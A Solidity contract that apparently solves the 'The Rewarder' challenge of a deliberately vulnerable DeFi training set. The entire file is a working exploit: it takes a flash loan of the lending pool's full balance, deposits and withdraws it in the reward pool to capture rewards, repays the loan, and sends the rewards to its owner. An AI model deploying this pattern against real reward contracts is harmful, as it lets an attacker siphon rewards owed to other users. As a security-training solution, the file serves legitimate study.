// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {TheRewarderPool} from "./TheRewarderPool.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {RewardToken} from "./RewardToken.sol";

contract Exploit {
    TheRewarderPool private immutable rewarder;
    FlashLoanerPool private immutable flashLoaner;
    DamnValuableToken private immutable dvt;
    RewardToken private immutable rwt;
    address private immutable owner;

    constructor(TheRewarderPool _rewarder, FlashLoanerPool _flashLoaner) {
        owner = msg.sender;
        rewarder = _rewarder;
        flashLoaner = _flashLoaner;
        dvt = _rewarder.liquidityToken();
        rwt = _rewarder.rewardToken();
    }

    function exploit() external {
        uint256 poolBalance = dvt.balanceOf(address(flashLoaner));
        flashLoaner.flashLoan(poolBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        dvt.transfer(address(flashLoaner), amount);
        uint256 rewardBalance = rwt.balanceOf(address(this));
        rwt.transfer(owner, rewardBalance);
    }
}